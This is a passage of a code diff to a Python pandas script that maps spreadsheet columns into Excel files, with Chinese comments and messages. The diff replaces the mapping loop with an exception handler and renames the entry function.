-            new_rows = []
-            for _, row in df_src.iterrows():
-                new_item = {}
-                for target_col, src_ref in mapping.items():
-                    if callable(src_ref):
-                        new_item[target_col] = src_ref(row)
-                    elif src_ref in df_src.columns:
-                        val = row[src_ref]
-                        new_item[target_col] = val if pd.notna(val) else ""
-                    else:
-                        new_item[target_col] = src_ref
-                new_rows.append(new_item)
-
-            if new_rows:
-                # --- ✨ 关键修改点：强制指定列顺序 ---
-                df_final = pd.DataFrame(new_rows, columns=list(mapping.keys()))
-                update_excel_file(target_path, df_final)
-    generate_summary_report(BASE_DIR, SOURCE_FILES)
+    except Exception as e:
+        print("\n❌ 代码执行过程中出错")
+        traceback.print_exc()
+        input("\n按任意键退出...")
+        sys.exit(1)
 
 
 if __name__ == "__main__":
-    run_main()
+    main()
